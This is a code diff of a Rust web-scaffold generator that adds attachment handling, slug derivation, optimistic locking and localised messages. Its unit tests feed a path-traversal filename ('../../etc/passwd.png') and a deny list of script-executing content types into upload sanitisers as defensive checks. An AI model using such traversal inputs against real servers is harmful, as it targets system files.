+        messages.insert("en".to_owned(), en);
+        let config = autumn_web::i18n::I18nConfig::default();
+        let bundle = autumn_web::i18n::Bundle::from_messages(messages, &config);
+        autumn_web::i18n::Locale::new("en").with_bundle(std::sync::Arc::new(bundle))
+    }
+"#,
+            "&locale(), ",
+        )
+    } else {
+        ("", "")
+    };
+    let attachment_read_back_unit_tests = if has_attachments {
+        format!(
+            r#"
+
+#[cfg(test)]
+mod attachment_read_back_tests {{
+    use super::{{LINKABLE_CONTENT_TYPES, attachment_link, upload_extension}};
+    use autumn_web::storage::Blob;
+
+    fn blob(key: &str) -> Blob {{
+        Blob::new("test", key, "image/png", 17)
+    }}
+{attachment_test_locale_helper}
+    #[test]
+    fn renders_an_em_dash_when_the_column_is_null() {{
+        assert_eq!(attachment_link({attachment_test_locale_arg}None, None, "cover").into_string(), "\u{{2014}}");
+    }}
+
+    #[test]
+    fn labels_the_link_from_the_column_and_the_stored_extension() {{
+        let stored = blob("posts/cover/1700000000_abc.png");
+        let html = attachment_link({attachment_test_locale_arg}Some(&stored), Some("/_blobs/x?sig=1"), "cover").into_string();
+        assert!(html.contains("href=\"/_blobs/x?sig=1\""), "{{html}}");
+        // Not the opaque key: a download has to land with a usable name.
+        assert!(html.contains("download=\"cover.png\""), "{{html}}");
+        assert!(html.contains(">cover.png<"), "{{html}}");
+        assert!(html.contains("image/png"), "{{html}}");
+        assert!(html.contains("17 bytes"), "{{html}}");
+    }}
+
+    #[test]
+    fn drops_the_anchor_when_no_url_could_be_signed() {{
+        let stored = blob("posts/cover/1700000000_abc.png");
+        let html = attachment_link({attachment_test_locale_arg}Some(&stored), None, "cover").into_string();
+        assert!(!html.contains("<a "), "{{html}}");
+        assert!(html.contains("cover.png"), "{{html}}");
+    }}
+
+    #[test]
+    fn refuses_to_link_content_types_that_execute_as_same_origin_script() {{
+        // The local backend replays the stored content type from THIS origin with
+        // no `Content-Disposition`, and the default CSP allows `script-src 'self'`,
+        // so navigating to a stored `.html`/`.svg` would run it as same-origin
+        // script. `attachment_url` must not hand out a URL for those at all.
+        for dangerous in [
+            "text/html",
+            "image/svg+xml",
+            "application/xhtml+xml",
+            "text/xml",
+            "application/xml",
+            "text/javascript",
+            "application/javascript",
+        ] {{
+            assert!(
+                !LINKABLE_CONTENT_TYPES.contains(&dangerous),
+                "{{dangerous}} must never be linkable"
+            );
+        }}
+        // The ordinary upload types a scaffold is actually used for stay linkable.
+        for safe in ["image/png", "image/jpeg", "application/pdf", "text/plain"] {{
+            assert!(LINKABLE_CONTENT_TYPES.contains(&safe), "{{safe}} should link");
+        }}
+    }}
+
+    #[test]
+    fn keeps_only_a_short_safe_lowercase_extension() {{
+        assert_eq!(upload_extension(Some("holiday.PNG")), ".png");
+        assert_eq!(upload_extension(Some("archive.tar.gz")), ".gz");
+        // No extension to take, or nothing safe to take.
+        assert_eq!(upload_extension(None), "");
+        assert_eq!(upload_extension(Some("noextension")), "");
+        assert_eq!(upload_extension(Some("a.verylongextension")), "");
+        assert_eq!(upload_extension(Some("evil.p g")), "");
+        assert_eq!(upload_extension(Some("evil.p/g")), "");
+        // `.meta` is the local backend's sidecar suffix and is reserved.
+        assert_eq!(upload_extension(Some("sneaky.meta")), "");
+        // A traversal attempt keeps nothing but the final extension.
+        assert_eq!(upload_extension(Some("../../etc/passwd.png")), ".png");
+    }}
+}}
+"#,
+        )
+    } else {
+        String::new()
+    };
+
     // Issue #1872: the create/update handlers stream each uploaded file to the
     // blob store *before* changeset validation and the DB write, so any early
     // return after the save would orphan the just-uploaded blob. We record only
@@ -2274,6 +4891,19 @@ fn render_routes_file(
     } else {
         ""
     };
+    // Issue #1872 follow-on: this check sits *after* the uploaded file was
+    // streamed to the store, so a plain `?` here would orphan the blob whenever
+    // the record policy denies the actor. It gets the same cleanup-then-return
+    // treatment as every other post-save early return.
+    let authz_attachment_update = if authorize && has_attachments {
+        format!(
+            "if let Err(err) = autumn_web::authorization::authorize::<{pascal_name}>({create_update_state_expr}, &session, \"update\", &current).await {{\n        \
+             {blob_cleanup}return Err(err);\n    \
+             }}\n    "
+        )
+    } else {
+        String::new()
+    };
     let form_decode_block = if has_attachments {
         let mut blob_decls = String::new();
         let mut match_arms = String::new();
@@ -2297,9 +4927,10 @@ fn render_routes_file(
                 "            Some(\"{name}\") => {{\n                \
                  if field.file_name().is_some_and(|file_name| !file_name.is_empty()) {{\n                    \
                  let key = format!(\n                        \
-                 \"{plural}/{name}/{{}}_{{}}\",\n                        \
+                 \"{plural}/{name}/{{}}_{{}}{{}}\",\n                        \
                  chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default(),\n                        \
-                 uuid::Uuid::new_v4()\n                    \
+                 uuid::Uuid::new_v4(),\n                        \
+                 upload_extension(field.file_name())\n                    \
                  );\n                    \
                  let blob = field.save_to_blob_store(&*store, key).await?;\n                    \
                  saved_blob_keys.push(blob.key.clone());\n                    \
@@ -2362,6 +4993,69 @@ fn render_routes_file(
     // Create: build `New{Pascal}` then bind each streamed blob (a `None` blob
     // means no file was submitted — the column stays NULL, satisfying the
     // optional-empty-as-NULL acceptance criterion).
+    // Issue #1260 AC4: on create, when the submitted slug is blank, derive it
+    // from the `from` source field via `autumn_web::slugify`, then probe for
+    // a collision and append a deterministic `-2`, `-3`, ... suffix until a
+    // free value is found — so two records deriving the same base slug (e.g.
+    // two posts both titled "Hello") get distinct URLs instead of a 422 on
+    // the `UNIQUE INDEX`. A non-blank submitted slug (the form exposes it as
+    // a plain text input) passes through untouched here; its own uniqueness
+    // is still enforced by the existing `unique`-field violation handling
+    // below, exactly like any other `unique` column.
+    //
+    // A derived value equal to a static sibling route segment is treated as
+    // taken even though it isn't in the table yet: axum's router (matchit)
+    // always prefers a static route over the `GET /{plural}/{slug}` capture,
+    // so a record whose slug were literally "new" (or "search", when
+    // `--searchable` emits `GET /{plural}/search`) would never be reachable
+    // at its own show page. This only guards the DERIVED path — an
+    // explicitly *submitted* slug of one of these isn't rejected here,
+    // matching this AC's blank-only scope (out of scope: general
+    // reserved-word validation on a hand-typed slug).
+    // Issue #1332 adds `GET /{plural}/trash` to that set of static siblings, so
+    // a derived slug of "trash" must be treated as taken too — otherwise a post
+    // titled "Trash" would be permanently shadowed by the trash view.
+    let reserved_segment_guard = {
+        let mut guard = String::from("candidate != \"new\"");
+        if search_enabled {
+            guard.push_str(" && candidate != \"search\"");
+        }
+        if trash_enabled {
+            guard.push_str(" && candidate != \"trash\"");
+        }
+        guard
+    };
+    #[allow(clippy::option_if_let_else)] // nested map_or_else closures read worse here
+    let slug_derive_block = if let Some(slug) = slug_field {
+        let field = &slug.name;
+        let from = slug
+            .constraints
+            .from
+            .as_deref()
+            .expect("parse_fields guarantees a slug field carries a `from` constraint");
+        format!(
+            "\n    if new.{field}.is_empty() {{\n        \
+             let base = autumn_web::slugify(&new.{from});\n        \
+             let mut candidate = base.clone();\n        \
+             let mut suffix: i64 = 2;\n        \
+             loop {{\n            \
+             let count: i64 = {plural}::table\n                \
+             .filter({plural}::{field}.eq(&candidate))\n                \
+             .count()\n                \
+             .get_result(&mut *db)\n                \
+             .await?;\n            \
+             if count == 0 && {reserved_segment_guard} {{\n                \
+             break;\n            \
+             }}\n            \
+             candidate = format!(\"{{base}}-{{suffix}}\");\n            \
+             suffix += 1;\n        \
+             }}\n        \
+             new.{field} = candidate;\n    \
+             }}"
+        )
+    } else {
+        String::new()
+    };
     let create_new_block = if has_attachments {
         let mut binds = String::new();
         for f in &attachment_fields {
@@ -2369,15 +5063,64 @@ fn render_routes_file(
             let _ = write!(binds, "\n    new.{name} = {name}_blob;");
         }
         format!("{into_new_bind}{binds}")
+    } else if slug_field.is_some() {
+        format!("let mut new = {into_new_call};{slug_derive_block}")
     } else {
         format!("let new = {into_new_call};")
+    };
+    // Issue #1260 review finding: `update` needs the SAME blank-derives-a-slug
+    // behavior `create` has — a submitted slug isn't required (AC4's "plain
+    // optional text input"), so clearing it on edit must re-derive rather
+    // than persist an empty string that breaks the record's own `/{slug}`
+    // route. Identical to `slug_derive_block` except the collision probe
+    // excludes the record's OWN current row via `{id_value_expr}` (the path
+    // extractor's still-old value) — otherwise re-deriving to the same slug
+    // a no-op edit would produce (title unchanged) would spuriously collide
+    // with itself and pick up an unwanted `-2` suffix.
+    #[allow(clippy::option_if_let_else)] // nested map_or_else closures read worse here
+    let update_slug_derive_block = if let Some(slug) = slug_field {
+        let field = &slug.name;
+        let from = slug
+            .constraints
+            .from
+            .as_deref()
+            .expect("parse_fields guarantees a slug field carries a `from` constraint");
+        format!(
+            "\n    if new.{field}.is_empty() {{\n        \
+             let base = autumn_web::slugify(&new.{from});\n        \
+             let mut candidate = base.clone();\n        \
+             let mut suffix: i64 = 2;\n        \
+             loop {{\n            \
+             let count: i64 = {plural}::table\n                \
+             .filter({plural}::{field}.eq(&candidate))\n                \
+             .filter({plural}::{field}.ne({id_value_expr}))\n                \
+             .count()\n                \
+             .get_result(&mut *db)\n                \
+             .await?;\n            \
+             if count == 0 && {reserved_segment_guard} {{\n                \
+             break;\n            \
+             }}\n            \
+             candidate = format!(\"{{base}}-{{suffix}}\");\n            \
+             suffix += 1;\n        \
+             }}\n        \
+             new.{field} = candidate;\n    \
+             }}"
+        )
+    } else {
+        String::new()
     };
     // Update: preserve the existing blob when no new file was uploaded
     // (`streamed.or(current)`), so an edit that doesn't touch the file leaves the
     // stored attachment intact instead of nulling it. The current row is loaded
     // through the same handle the update statement uses (repository on the live
     // path, sharded repo on the sharded path, diesel otherwise).
-    let update_new_block = if has_attachments {
+    //
+    // Issue #1236 (AC3): the load is spliced in BEFORE the validation guard, not
+    // after it, because every 422 re-render of the edit form has to show which
+    // file is currently stored (a file input can't be repopulated). Loading first
+    // also runs the record policy before the re-render, so a forbidden actor is
+    // denied instead of being handed the form back.
+    let (update_load_and_authorize_block, update_new_block) = if has_attachments {
         // Issue #1872: loading the current row also happens after the blob save,
         // so its fallible steps clean up the just-saved blob(s) before returning.
         let load_current = if live && !sharded {
@@ -2422,11 +5165,25 @@ fn render_routes_file(
         let mut binds = String::new();
         for f in &attachment_fields {
             let name = &f.name;
-            let _ = write!(binds, "\n    new.{name} = {name}_blob.or(current.{name});");
+            // `.clone()` rather than a move: `current` stays whole so the
+            // unique-violation 422 further down can still render the currently
+            // stored attachment from it (issue #1236, AC3).
+            let _ = write!(
+                binds,
+                "\n    new.{name} = {name}_blob.or(current.{name}.clone());"
+            );
         }
-        format!("{load_current}{authz_attachment_update}{into_new_bind}{binds}")
+        (
+            format!("{load_current}{authz_attachment_update}"),
+            format!("{into_new_bind}{binds}"),
+        )
+    } else if slug_field.is_some() {
+        (
+            String::new(),
+            format!("let mut new = {into_new_call};{update_slug_derive_block}"),
+        )
     } else {
-        format!("let new = {into_new_call};")
+        (String::new(), format!("let new = {into_new_call};"))
     };
 
     // Shared re-render bodies: the same `layout(...)` markup the GET handlers
@@ -2440,6 +5197,76 @@ fn render_routes_file(
     // carry zero per-column code. `--live-validation` keeps the per-field
     // emission path: its htmx inline-validation inputs (`text_input_htmx`)
     // have no `FieldControl` equivalent for `form_for` to dispatch to.
+    // Issue #1318 (AC3): the inline conflict banner. Rendered above the edit
+    // form by BOTH form-rendering paths, gated on the `lock_conflict` binding
+    // every splice site provides — so a stale submit lands the author back on
+    // their own edits with an explanation, never on a dead-end error page. The
+    // wording states what happened and what to do, because a bare "409
+    // Conflict" tells a non-technical author nothing.
+    // Issue #1349: the banner is the one thing an author reads at the moment
+    // their save is rejected, so it is the LAST place to fall back to English.
+    // Recorded only when the scaffold has a lock column — an `en.ftl` key no
+    // view references fails `autumn i18n check --strict`.
+    let lock_conflict_banner = if lock_version.is_some() {
+        format!(
+            "@if lock_conflict {{\n            \
+             p class=\"autumn-flash autumn-flash--error\" role=\"alert\" {{\n                \
+             {}\n            \
+             }}\n        \
+             }}\n        ",
+            labels.markup(
+                "common.lock.conflict",
+                "This record was changed by someone else since you opened it. \
+                 Your changes are shown below — review them and save again to apply them.",
+            )
+        )
+    } else {
+        String::new()
+    };
+    // The `--live-validation` form is raw markup rather than a `form_for` call,
+    // so its hidden version input is spliced straight into the `<form>` body.
+    let lock_version_hidden_input = if lock_version.is_some() {
+        "            input type=\"hidden\" name=\"lock_version\" value=(lock_version_value);\n"
+    } else {
+        ""
+    };
+    // The hidden field is read straight off the raw body rather than through
+    // `{Pascal}Form`: the version is not one of the model's editable columns, so
+    // it has no place on the form struct (which would render it as a visible
+    // control and let a submit set it like any other value). `serde_urlencoded`
+    // ignores the unknown pair when decoding the form, so the two coexist.
+    //
+    // A missing or unparsable value is a 400, not a silent `0`: `0` would be a
+    // *plausible* version that could match a freshly created row and wave a
+    // hand-crafted submit straight past the guard.
+    //
+    // It scans EVERY `lock_version` pair for the first that parses as an
+    // integer, rather than taking the first pair and parsing that. The CSRF and
+    // submit-token field names are app-configurable (`[security.csrf]` /
+    // `[security.submit_token] field_name`), so an app may legitimately name one
+    // of them `lock_version` — and those hidden inputs are prepended, so they
+    // land in the body FIRST. Stopping at the first pair would read a UUID,
+    // fail to parse it, and 400 every single update even though the real
+    // version was right there a few bytes later.
+    let lock_version_parser = lock_version.map_or_else(String::new, |_| {
+        format!(
+            "\n/// Read the hidden `lock_version` the edit form was rendered with\n\
+             /// (issue #1318).\n\
+             ///\n\
+             /// This is the version the author was looking at, NOT the version to\n\
+             /// write — the `UPDATE` uses it as a `WHERE` guard and increments the\n\
+             /// column itself, so a row that moved on in the meantime matches zero\n\
+             /// rows and the handler re-renders at 409.\n\
+             fn parse_lock_version(body: &Bytes) -> AutumnResult<{lock_version_ty}> {{\n    \
+             url::form_urlencoded::parse(body.as_ref())\n        \
+             .filter(|(key, _)| key == \"lock_version\")\n        \
+             .find_map(|(_, value)| value.parse::<{lock_version_ty}>().ok())\n        \
+             .ok_or_else(|| AutumnError::bad_request_msg(\n            \
+             \"missing or invalid lock_version: re-open the edit form and try again\",\n        \
+             ))\n\
+             }}\n"
+        )
+    });
     let (new_form_body, edit_form_body, form_for_helper) = if live_validation {
         // Issue #1124: `new_form`, `edit_form`, and both 422 re-render
         // branches render the same inputs from a `Changeset<{Pascal}Form>`
@@ -2475,41 +5302,44 @@ fn render_routes_file(
         // it carries an `onclick` confirm the current `Button` API can't express,
         // and converting would drop the confirmation guard.
         let new_form_layout = format!(
-            "{layout_fn}(\"New {pascal_name}\", {cp_new}{flash_arg}, html! {{\n        \
-             h1 {{ \"New {pascal_name}\" }}\n        \
+            "{layout_fn}({new_title}, {cp_new}{flash_arg}, html! {{\n        \
+             h1 {{ {new_heading} }}\n        \
              form action=(paths::create()) method=\"post\"{form_enctype} {{\n            \
              (csrf_input(csrf.as_ref(), csrf_field.as_ref()))\n            \
              (submit_token_input(submit_token.as_ref(), submit_field.as_ref()))\n{changeset_inputs}            \
-             (autumn_web::a11y::Button::new(\"Create\").submit())\n        \
+             (autumn_web::a11y::Button::new({create_button}).submit())\n        \
              }}\n    \
              }})"
         );
         let edit_form_layout = format!(
-            "{layout_fn}(&format!(\"Edit {pascal_name} #{{}}\", *id), {cp_edit}{flash_arg}, html! {{\n        \
-             h1 {{ \"Edit {pascal_name} #\" (*id) }}\n        \
+            "{layout_fn}({edit_title_live}, {cp_edit}{flash_arg}, html! {{\n        \
+             h1 {{ {edit_heading_live} }}\n        \
+             {lock_conflict_banner}\
+             {edit_current_attachment_markup}\
              form action=(paths::update(*id)) method=\"post\"{form_enctype} {{\n            \
              (csrf_input(csrf.as_ref(), csrf_field.as_ref()))\n            \
-             (submit_token_input(submit_token.as_ref(), submit_field.as_ref()))\n{changeset_inputs}            \
-             (autumn_web::a11y::Button::new(\"Save\").submit())\n        \
+             (submit_token_input(submit_token.as_ref(), submit_field.as_ref()))\n{lock_version_hidden_input}{changeset_inputs}            \
+             (autumn_web::a11y::Button::new({save_button}).submit())\n        \
              }}\n        \
              form action=(paths::delete(*id)) method=\"post\" {{\n            \
              (csrf_input(csrf.as_ref(), csrf_field.as_ref()))\n            \
-             button type=\"submit\" onclick=\"return confirm('Delete this {pascal_name}?')\" {{ \"Delete\" }}\n        \
+             {delete_confirm_bind}button type=\"submit\" onclick={delete_confirm_attr} {{ {delete_button} }}\n        \
              }}\n    \
              }})"
         );
-        let (new_form_body, edit_form_body) = if has_reference_selects {
-            (
-                format!("{{\n{option_loads}        {new_form_layout}\n    }}"),
-                format!("{{\n{option_loads}        {edit_form_layout}\n    }}"),
-            )
-        } else {
-            (new_form_layout, edit_form_layout)
-        };
+        let (new_form_body, edit_form_body) = wrap_form_bodies(
+            new_form_layout,
+            edit_form_layout,
+            &option_loads,
+            &edit_attachment_url_binds,
+            &resource_bind_form,
+        );
         // The referenced-row option loaders are emitted regardless: they
-        // populate the in-form `<select>` (issue #1750) AND the issue #1146
-        // index parent-label map (`render_index_reference_label_loads` collects
-        // each `{name}_select_options(...)` into a `HashMap`).
+        // populate the in-form `<select>` (issue #1750). The issue #1146 index
+        // parent-label map is built separately, scoped to the page's own rows
+        // (`render_index_reference_label_loads`, #835) rather than through
+        // these loaders, which fetch every row of the referenced table — right
+        // for a `<select>`'s full option list, wrong for labeling ~20 rows.
         let option_loaders =
             render_reference_option_loaders(&display_reference_fields, db_ty, &reference_displays);
         (new_form_body, edit_form_body, option_loaders)
@@ -2536,35 +5366,57 @@ fn render_routes_file(
         // no extra argument, keeping the pre-#1326 call byte-identical.
         let form_exclude_create = if has_state_machine { ", false" } else { "" };
         let form_exclude_edit = if has_state_machine { ", true" } else { "" };
+        // Issue #1318: the same shape for the optimistic-locking version — the
+        // edit call hands the helper the version to hide in the form, the create
+        // call `None` (no row, no version). Absent entirely without the column.
+        let form_lock_create = if lock_version.is_some() { ", None" } else { "" };
+        // Issue #1323: the FLAT create/edit forms keep the belongs_to select
+        // (#1146) — only the nested inline form drops it — so both pass `false`
+        // for the helper's `exclude_parent_fk` flag. Absent without
+        // `--belongs-to`, keeping the pre-#1323 call byte-identical.
+        let form_parent_fk = if nesting.is_some() { ", false" } else { "" };
+        let form_lock_edit = if lock_version.is_some() {
+            ", Some(lock_version_value)"
+        } else {
+            ""
+        };
         let new_form_layout = format!(
-            "{layout_fn}(\"New {pascal_name}\", {cp_new}{flash_arg}, html! {{\n        \
-             h1 {{ \"New {pascal_name}\" }}\n        \
-             ({snake_name}_form_for(&changeset, paths::create(), \"Create\", csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(){option_args}{form_exclude_create}))\n    \
+            "{layout_fn}({new_title}, {cp_new}{flash_arg}, html! {{\n        \
+             h1 {{ {new_heading} }}\n        \
+             ({snake_name}_form_for({form_for_locale_arg}&changeset, paths::create(), {create_button_ref}, csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(){option_args}{form_exclude_create}{form_lock_create}{form_parent_fk}))\n    \
              }})"
         );
         let edit_form_layout = format!(
-            "{layout_fn}(&format!(\"Edit {pascal_name} #{{}}\", *id), {cp_edit}{flash_arg}, html! {{\n        \
-             h1 {{ \"Edit {pascal_name} #\" (*id) }}\n        \
-             ({snake_name}_form_for(&changeset, paths::update(*id), \"Save\", csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(){option_args}{form_exclude_edit}))\n        \
-             form action=(paths::delete(*id)) method=\"post\" {{\n            \
+            "{layout_fn}({edit_title}, {cp_edit}{flash_arg}, html! {{\n        \
+             h1 {{ {edit_heading} }}\n        \
+             {lock_conflict_banner}\
+             {edit_current_attachment_markup}\
+             ({snake_name}_form_for({form_for_locale_arg}&changeset, paths::update({id_value_expr}), {save_button_ref}, csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(){option_args}{form_exclude_edit}{form_lock_edit}{form_parent_fk}))\n        \
+             form action=(paths::delete({id_value_expr})) method=\"post\" {{\n            \
              (csrf_input(csrf.as_ref(), csrf_field.as_ref()))\n            \
-             button type=\"submit\" onclick=\"return confirm('Delete this {pascal_name}?')\" {{ \"Delete\" }}\n        \
+             {delete_confirm_bind}button type=\"submit\" onclick={delete_confirm_attr} {{ {delete_button} }}\n        \
              }}\n    \
              }})"
         );
-        let (new_form_body, edit_form_body) = if has_reference_selects {
-            (
-                format!("{{\n{option_loads}        {new_form_layout}\n    }}"),
-                format!("{{\n{option_loads}        {edit_form_layout}\n    }}"),
-            )
-        } else {
-            (new_form_layout, edit_form_layout)
-        };
+        let (new_form_body, edit_form_body) = wrap_form_bodies(
+            new_form_layout,
+            edit_form_layout,
+            &option_loads,
+            &edit_attachment_url_binds,
+            &resource_bind_form,
+        );
         (
             new_form_body,
             edit_form_body,
-            render_form_for_helper(pascal_name, snake_name, fields, missing_reference_targets)
-                + &render_reference_option_loaders(&reference_fields, db_ty, &reference_displays),
+            render_form_for_helper(
+                pascal_name,
+                snake_name,
+                fields,
+                labels,
+                missing_reference_targets,
+                lock_version.map(|_| lock_version_ty.as_str()),
+                nesting.map(|n| n.fk.as_str()),
+            ) + &render_reference_option_loaders(&reference_fields, db_ty, &reference_displays),
         )
     };
     let form_model_impl = render_form_model_impl(pascal_name);
@@ -2579,6 +5431,35 @@ fn render_routes_file(
         render_unique_constraints_const(plural, &unique_fields, all_fields)
     };
 
+    // Issue #1349: "has already been taken" is shown to whoever submitted the
+    // duplicate, so it is view text like any other. It cannot come from
+    // `UNIQUE_CONSTRAINTS` under `--i18n` — that is a `const`, evaluated before
+    // there is a request to have a locale — so the const keeps its (constraint,
+    // field) mapping and the MESSAGE is looked up where the changeset error is
+    // built, in a handler that holds the extractor. One shared key rather than
+    // one per field: the const's message is the same sentence for every column.
+    //
+    // Recorded only when the scaffold actually has a unique column, for the
+    // same reason as the attachment meta — an `en.ftl` key no view references
+    // fails `autumn i18n check --strict`.
+    let (unique_message_binding, unique_message_expr) = if unique_fields.is_empty() {
+        ("message", "message.to_string()".to_owned())
+    } else {
+        (
+            if labels.enabled() {
+                "_message"
+            } else {
+                "message"
+            },
+            labels.expr(
+                "common.error.taken",
+                "has already been taken",
+                "message.to_string()",
+                &[],
+            ),
+        )
+    };
+
     let create_insert_block = if !unique_fields.is_empty() {
         // Issue #1872: `{blob_cleanup}` (empty unless the scaffold has attachment
         // fields) best-effort deletes the just-saved blob(s) on both the
@@ -2589,15 +5470,15 @@ fn render_routes_file(
              Ok(())\n    \
              }}.await;\n    \
              if let Err(err) = result {{\n        \
-             if let Some((field, message)) = autumn_web::error::unique_violation_field(&err, UNIQUE_CONSTRAINTS) {{\n            \
+             if let Some((field, {unique_message_binding})) = autumn_web::error::unique_violation_field(&err, UNIQUE_CONSTRAINTS) {{\n            \
              let mut errors = std::collections::HashMap::new();\n            \
-             errors.insert(field.to_string(), vec![message.to_string()]);\n            \
+             errors.insert(field.to_string(), vec![{unique_message_expr}]);\n            \
              let changeset = Changeset::from_errors(changeset.into_inner(), errors);\n            \
              {blob_cleanup}return Ok((autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY, {new_form_body}).into_response());\n        \
              }}\n        \
              {blob_cleanup}return Err(err);\n    \
              }}\n    \
-             flash.success(\"{pascal_name} created\").await;\n    \
+             flash.success({flash_created}).await;\n    \
              Ok(autumn_web::Redirect::to(&paths::index()).into_response())"
         )
     } else if has_attachments {
@@ -2611,13 +5492,13 @@ fn render_routes_file(
              if let Err(err) = result {{\n        \
              {blob_cleanup}return Err(err);\n    \
              }}\n    \
-             flash.success(\"{pascal_name} created\").await;\n    \
+             flash.success({flash_created}).await;\n    \
              Ok(autumn_web::Redirect::to(&paths::index()).into_response())"
         )
     } else {
         format!(
             "{create_stmt}\n    \
-             flash.success(\"{pascal_name} created\").await;\n    \
+             flash.success({flash_created}).await;\n    \
              Ok(autumn_web::Redirect::to(&paths::index()).into_response())"
         )
     };
@@ -2649,6 +5530,71 @@ fn render_routes_file(
          }}\n"
     );
 
+    // What the `update` handler does when its `UPDATE` matched no rows.
+    //
+    // Without optimistic locking that can only mean the row is gone: 404, as
+    // before. With a `lock_version` guard (issue #1318) it is ambiguous — the
+    // row may be missing OR the version may have moved on under us — so the
+    // handler re-reads it to tell the two apart:
+    //
+    //   * still there  → someone else committed a newer version between the
+    //     edit-form load and this submit. Re-render the SAME edit body at 409
+    //     with the user's submitted values intact, an inline banner, and the
+    //     row's CURRENT version in the hidden field. Carrying the stale version
+    //     forward instead would make the form permanently unsavable — every
+    //     resubmit would lose the same race again.
+    //   * gone → the pre-#1318 404.
+    //
+    // `{blob_cleanup}` and the id expression differ per branch, so both are
+    // parameters; without a lock column the output is the pre-#1318 text
+    // verbatim.
+    // The re-read row is re-authorized before anything from it is used. The
+    // policy check at the top of `update` ran against the snapshot this request
+    // loaded; a record policy can depend on mutable row data, so the concurrent
+    // write that moved the version may also have moved the row out of this
+    // actor's reach. Only the version integer crosses over here (the re-render
+    // shows the author's own submitted values), but re-checking costs one call
+    // and removes the whole class rather than arguing about how sensitive a
+    // counter is. Empty without a policy.
+    let conflict_reauthz = if authorize {
+        format!(
+            "            autumn_web::authorization::authorize::<{pascal_name}>({create_update_state_expr}, &session, \"update\", &current).await?;\n"
+        )
+    } else {
+        String::new()
+    };
+    let update_zero_rows_block = |blob_cleanup: &str, id_expr: &str| -> String {
+        let not_found = format!(
+            "{blob_cleanup}return Err(AutumnError::not_found_msg(format!(\n            \
+             \"{pascal_name} with id {{}} not found\", {id_expr}\n        \
+             )));"
+        );
+        if lock_version.is_none() {
+            return not_found;
+        }
+        format!(
+            "{blob_cleanup}let current: Option<{pascal_name}> = {plural}::table\n            \
+             .{find_expr}\n            \
+             .select({pascal_name}::as_select())\n            \
+             .first(&mut *db)\n            \
+             .await\n            \
+             .optional()?;\n        \
+             if let Some(current) = current {{\n            \
+             // Lost the race: re-render this author's edits over the row as it\n            \
+             // now stands, so nothing they typed is thrown away.\n\
+             {conflict_reauthz}            \
+             let lock_version_value = current.lock_version;\n            \
+             let lock_conflict = true;\n            \
+             return Ok((autumn_web::reexports::http::StatusCode::CONFLICT, {edit_form_body}).into_response());\n        \
+             }}\n        \
+             {not_found}"
+        )
+    };
+
+    // A slug field is always `unique` (issue #1260), so a slug scaffold
+    // always takes THIS branch — the `has_attachments`/plain branches below
+    // still hard-code the pre-#1260 `*id` literal, safe only because they're
+    // unreachable whenever a slug field is present.
     let update_apply_block = if !unique_fields.is_empty() {
         // Issue #1872: `{blob_cleanup}` (empty unless the scaffold has attachment
         // fields) best-effort deletes the just-saved blob(s) on the
@@ -2661,9 +5607,9 @@ fn render_routes_file(
              let updated = match result {{\n        \
              Ok(updated) => updated,\n        \
              Err(err) => {{\n            \
-             if let Some((field, message)) = autumn_web::error::unique_violation_field(&err, UNIQUE_CONSTRAINTS) {{\n                \
+             if let Some((field, {unique_message_binding})) = autumn_web::error::unique_violation_field(&err, UNIQUE_CONSTRAINTS) {{\n                \
              let mut errors = std::collections::HashMap::new();\n                \
-             errors.insert(field.to_string(), vec![message.to_string()]);\n                \
+             errors.insert(field.to_string(), vec![{unique_message_expr}]);\n                \
              let changeset = Changeset::from_errors(changeset.into_inner(), errors);\n                \
              {blob_cleanup}return Ok((autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY, {edit_form_body}).into_response());\n            \
              }}\n            \
@@ -2671,12 +5617,11 @@ fn render_routes_file(
              }}\n    \
              }};\n    \
              if updated == 0 {{\n        \
-             {blob_cleanup}return Err(AutumnError::not_found_msg(format!(\n            \
-             \"{pascal_name} with id {{}} not found\", *id\n        \
-             )));\n    \
+             {zero_rows}\n    \
              }}\n    \
-             flash.success(\"{pascal_name} updated\").await;\n    \
-             Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())"
+             flash.success({flash_updated}).await;\n    \
+             Ok(autumn_web::Redirect::to(&paths::show({update_redirect_expr})).into_response())",
+            zero_rows = update_zero_rows_block(blob_cleanup, &id_value_expr),
         )
     } else if has_attachments {
         // Issue #1872: no unique constraints, but the update write and the
@@ -2693,23 +5638,21 @@ fn render_routes_file(
              }}\n    \
              }};\n    \
              if updated == 0 {{\n        \
-             {blob_cleanup}return Err(AutumnError::not_found_msg(format!(\n            \
-             \"{pascal_name} with id {{}} not found\", *id\n        \
-             )));\n    \
+             {zero_rows}\n    \
              }}\n    \
-             flash.success(\"{pascal_name} updated\").await;\n    \
-             Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())"
+             flash.success({flash_updated}).await;\n    \
+             Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())",
+            zero_rows = update_zero_rows_block(blob_cleanup, "*id"),
         )
     } else {
         format!(
             "{update_stmt}\n    \
              if updated == 0 {{\n        \
-             return Err(AutumnError::not_found_msg(format!(\n            \
-             \"{pascal_name} with id {{}} not found\", *id\n        \
-             )));\n    \
+             {zero_rows}\n    \
              }}\n    \
-             flash.success(\"{pascal_name} updated\").await;\n    \
-             Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())"
+             flash.success({flash_updated}).await;\n    \
+             Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())",
+            zero_rows = update_zero_rows_block("", "*id"),
         )
     };
     // Issue #1125/#1830: load the target row and run the policy check *before*
@@ -2732,7 +5675,7 @@ fn render_routes_file(
         } else {
             format!(
                 "let {binding}: {pascal_name} = {plural}::table\n        \
-                 .find(*id)\n        \
+                 .{find_expr}\n        \
                  .select({pascal_name}::as_select())\n        \
                  .first(&mut *db)\n        \
                  .await\n        \
@@ -2771,19 +5714,42 @@ fn render_routes_file(
     } else {
         String::new()
     };
+    // Issue #1318: read the version the edit form was rendered against out of
+    // its hidden field, and seed the two bindings the shared edit body renders
+    // from. Both are re-bound (shadowed) by the 409 branch in
+    // `update_zero_rows_block`; on the 422 branches they keep these values, so a
